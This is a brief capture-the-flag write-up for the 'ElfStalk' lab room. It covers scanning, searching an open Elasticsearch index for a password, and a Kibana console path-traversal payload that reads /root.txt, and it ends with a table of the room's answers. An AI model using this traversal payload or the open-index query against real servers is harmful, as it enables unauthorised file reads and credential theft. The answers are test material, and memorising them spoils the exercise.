# Advent of Cyber 01 - 2019
# Day 24
# ElfStalk


> Machine IP : `10.10.241.99`

> Scanning using the nmap :
```
nmap -A -T5 10.10.241.99 -oN nmap.txt

```
> Directory search :
```
gobuster dir -u http://10.10.241.99:9200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php | tee directory.txt

```
> search for the following url :
```
http://10.10.241.99:9200/_search?q=password
```
> found credentials : `username is l33tperson and password is 9Qs58Ol3AXkMWLxiEyUyyf`

> goto the following link : `http://10.10.241.99:5601/app`

> for the flag we have to go to the following link : 
```
10.10.241.99:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../root.txt

```

> now look at the refference error for root.txt file

| Que$t1on$ | An$wer$ |
|-----------|---------|
| Find the password in the database | 9Qs58Ol3AXkMWLxiEyUyyf |
| Read the content of the /root.txt file | someELKfun |
